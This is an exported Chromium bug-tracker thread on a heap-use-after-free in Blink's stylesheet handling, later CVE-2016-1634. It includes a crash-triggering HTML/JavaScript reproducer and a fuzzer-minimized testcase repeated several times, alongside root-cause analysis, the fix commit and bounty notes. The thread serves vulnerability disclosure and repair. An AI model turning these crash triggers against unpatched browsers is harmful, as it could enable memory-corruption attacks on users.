<div id="div"></div>
<script>
    var div = document.getElementById("div");
    var shadowRoot = div.createShadowRoot();
    shadowRoot.innerHTML = "<form><input></form>";

    // Force a style recalc.
    getComputedStyle(document.body).color;

    var input = shadowRoot.querySelector("input");
    input.appendChild(document.createElement("style"));
    input.remove();
</script>

seems like bad sheet management somewhere, I'm not sure how forms are related, but the form and the input were required.

### es...@chromium.org (2015-12-02)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-12-02)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5696509850419200

Uploader: wfh@chromium.org
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x610000056d98
Crash State:
  blink::CSSStyleSheet::contents
  blink::ScopedStyleResolver::collectMatchingAuthorRules
  blink::StyleResolver::matchAuthorRules
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=343542:343570

Minimized Testcase (1.01 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv96WkhrnHt_RAriBgxqze_E3cU6NybTb5984zIVW8PJq-3tqcWnsvxru18Fs-Q4N5y4OHv3OUipc6JYSyr1kSkpaSicalwGOmaJ-B60J5uad4CI8neVJKpXS4eUaMAO22iYnC8pQwiXCJ415RAyOnhb8uK4dRQ
<script>
        o0=window.document;
        o3=o0.implementation.createDocument('http://www.w3.org/1999/xlink',undefined);
        o5=o3.querySelector('*:not([id])');
        o9=o0.createElementNS('http://www.w3.org/1999/xhtml','form');
        o9.id='id2';
        o0.documentElement.appendChild(o9);
        o11=document.createElementNS('http://www.w3.org/1999/xhtml','form');
        o3.documentElement.appendChild(o11);
        document.documentElement.appendChild(o5);
        o11.innerHTML=unescape('<style>');
        o36=o0.createElement('menu');
        o47=document.createElementNS('http://www.w3.org/1999/xhtml','input');
        document.documentElement.appendChild(o36);
        o54=o36['createShadowRoot']();
        o63=o0.getElementById('id2');
        o54.appendChild(o63);
        window.top.setTimeout(timeout_23);
function timeout_23() {
        o47.innerHTML=unescape('<style>');
        o72=o0.createElement('figure');
        o63.appendChild(o47);
        o72.appendChild(o47);
}
</script>


See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

### [Deleted User] (2015-12-02)

It's a pseudoStateChanged() being triggered for the form element when the input is removed. Since we're in the middle of the process of removing a stylesheet, pseudoStateChanged() will call ensureResolver() (styleResolver not null, but contains pending stylesheets) which will add the shadow stylesheet to the document scope because the treeScope of the input and style elements are document() at this point in the removal process.



### [Deleted User] (2015-12-02)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-12-03)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5696509850419200

Uploader: wfh@chromium.org
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x610000056d98
Crash State:
  blink::CSSStyleSheet::contents
  blink::ScopedStyleResolver::collectMatchingAuthorRules
  blink::StyleResolver::matchAuthorRules
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=343542:343570

Minimized Testcase (1.01 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv96WkhrnHt_RAriBgxqze_E3cU6NybTb5984zIVW8PJq-3tqcWnsvxru18Fs-Q4N5y4OHv3OUipc6JYSyr1kSkpaSicalwGOmaJ-B60J5uad4CI8neVJKpXS4eUaMAO22iYnC8pQwiXCJ415RAyOnhb8uK4dRQ
<script>
        o0=window.document;
        o3=o0.implementation.createDocument('http://www.w3.org/1999/xlink',undefined);
        o5=o3.querySelector('*:not([id])');
        o9=o0.createElementNS('http://www.w3.org/1999/xhtml','form');
        o9.id='id2';
        o0.documentElement.appendChild(o9);
        o11=document.createElementNS('http://www.w3.org/1999/xhtml','form');
        o3.documentElement.appendChild(o11);
        document.documentElement.appendChild(o5);
        o11.innerHTML=unescape('<style>');
        o36=o0.createElement('menu');
        o47=document.createElementNS('http://www.w3.org/1999/xhtml','input');
        document.documentElement.appendChild(o36);
        o54=o36['createShadowRoot']();
        o63=o0.getElementById('id2');
        o54.appendChild(o63);
        window.top.setTimeout(timeout_23);
function timeout_23() {
        o47.innerHTML=unescape('<style>');
        o72=o0.createElement('figure');
        o63.appendChild(o47);
        o72.appendChild(o47);
}
</script>


See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

### cl...@chromium.org (2015-12-17)

rune@: Uh oh! This issue is still open and hasn't been updated in the last 14 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2015-12-31)

rune@: Uh oh! This issue is still open and hasn't been updated in the last 28 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### [Deleted User] (2016-01-04)

Regressed with: https://codereview.chromium.org/1285293003

I do have a workaround, but ideally this should be fixed by fixing https://crbug.com/chromium/567021.


### [Deleted User] (2016-01-04)

Workaround up for review:

https://codereview.chromium.org/1556963002/


### bu...@chromium.org (2016-01-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/0b0f3ace8820d371e6f4b2b61354728a71ce8356

commit 0b0f3ace8820d371e6f4b2b61354728a71ce8356
Author: rune <rune@opera.com>
Date: Tue Jan 12 22:11:24 2016

Avoid crash when updating stylesheets during a remove operation.

When we are in the middle of removing a subtree of a shadow tree
containing a style element, and one of the other elements schedules
style invalidation, we are synchronously trying to update rule features
when the style node is still inDocument() and isInShadowTree() while the
treeScope() has been reset to the document scope in preparation for
removing it from the tree. That caused us to add the sheet for the style
element being removed to our style data/rule features.

We should make updateActiveStyleSheets asynchronous (crbug.com/567021)
and schedule invalidations with the current rule features instead of
forcing an update of rule features through appendPendingAuthorStyleSheets.

Since updateActiveStyleSheets is currently synchronous and
appendPendingAuthorStyleSheets happens lazily, we are in an inconsistent
state which means we need to execute the latter in order to avoid
glitches in style invalidation because we are marking for
invalidation/recalc in the former step.

This crasher surfaced when we started looking up the treeScope() directly
in https://codereview.chromium.org/1285293003

R=esprehn@chromium.org
BUG=559292

Review URL: https://codereview.chromium.org/1556963002

Cr-Commit-Position: refs/heads/master@{#369004}

[add] http://crrev.com/0b0f3ace8820d371e6f4b2b61354728a71ce8356/third_party/WebKit/LayoutTests/fast/css/remove-stylesheet-from-shadow-form-crash-expected.txt
[add] http://crrev.com/0b0f3ace8820d371e6f4b2b61354728a71ce8356/third_party/WebKit/LayoutTests/fast/css/remove-stylesheet-from-shadow-form-crash.html
[modify] http://crrev.com/0b0f3ace8820d371e6f4b2b61354728a71ce8356/third_party/WebKit/Source/core/css/resolver/StyleResolver.cpp


### [Deleted User] (2016-01-12)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-01-13)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

Your fix is very close to the branch point. After the branch happens, please make sure to check if your fix is in.

- Your friendly ClusterFuzz

### cl...@chromium.org (2016-01-13)

ClusterFuzz has detected this issue as fixed in range 368885:369073.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5696509850419200

Uploader: wfh@chromium.org
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x610000056d98
Crash State:
  blink::CSSStyleSheet::contents
  blink::ScopedStyleResolver::collectMatchingAuthorRules
  blink::StyleResolver::matchAuthorRules
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=343542:343570
Fixed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=368885:369073

Minimized Testcase (1.01 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv96WkhrnHt_RAriBgxqze_E3cU6NybTb5984zIVW8PJq-3tqcWnsvxru18Fs-Q4N5y4OHv3OUipc6JYSyr1kSkpaSicalwGOmaJ-B60J5uad4CI8neVJKpXS4eUaMAO22iYnC8pQwiXCJ415RAyOnhb8uK4dRQ
<script>
        o0=window.document;
        o3=o0.implementation.createDocument('http://www.w3.org/1999/xlink',undefined);
        o5=o3.querySelector('*:not([id])');
        o9=o0.createElementNS('http://www.w3.org/1999/xhtml','form');
        o9.id='id2';
        o0.documentElement.appendChild(o9);
        o11=document.createElementNS('http://www.w3.org/1999/xhtml','form');
        o3.documentElement.appendChild(o11);
        document.documentElement.appendChild(o5);
        o11.innerHTML=unescape('<style>');
        o36=o0.createElement('menu');
        o47=document.createElementNS('http://www.w3.org/1999/xhtml','input');
        document.documentElement.appendChild(o36);
        o54=o36['createShadowRoot']();
        o63=o0.getElementById('id2');
        o54.appendChild(o63);
        window.top.setTimeout(timeout_23);
function timeout_23() {
        o47.innerHTML=unescape('<style>');
        o72=o0.createElement('figure');
        o63.appendChild(o47);
        o72.appendChild(o47);
}
</script>


See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### ti...@google.com (2016-01-19)

[Empty comment from Monorail migration]

### ti...@google.com (2016-01-19)

[Automated comment] Commit may have occurred before M49 branch point (1/15/2016), needs manual review.

### ss...@google.com (2016-01-21)

This change landed before the branch. Please confirm and remove the merge request. 

### am...@google.com (2016-01-23)

fix @ 369004, branch @ 369677, should be good to go, mr willis can correct me if i'm wrong

### ti...@google.com (2016-01-23)

#24: You are correct again, Mr Mineer. I shall enroll in remedial maths.



### ti...@google.com (2016-02-02)

[Empty comment from Monorail migration]

### ti...@google.com (2016-02-02)

[Empty comment from Monorail migration]

### ti...@google.com (2016-02-24)

[Empty comment from Monorail migration]

### ti...@google.com (2016-03-02)

Congrats - $3000 for this report as well. CVE-ID to follow.

### ti...@google.com (2016-03-02)

CVE-2016-1634

### ti...@google.com (2016-03-12)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-04-20)

This security bug has been closed for more than 14 weeks. Removing view restrictions.

For more details visit https://sites.google.com/a/chromium.org/dev/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/559292?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40083243)*
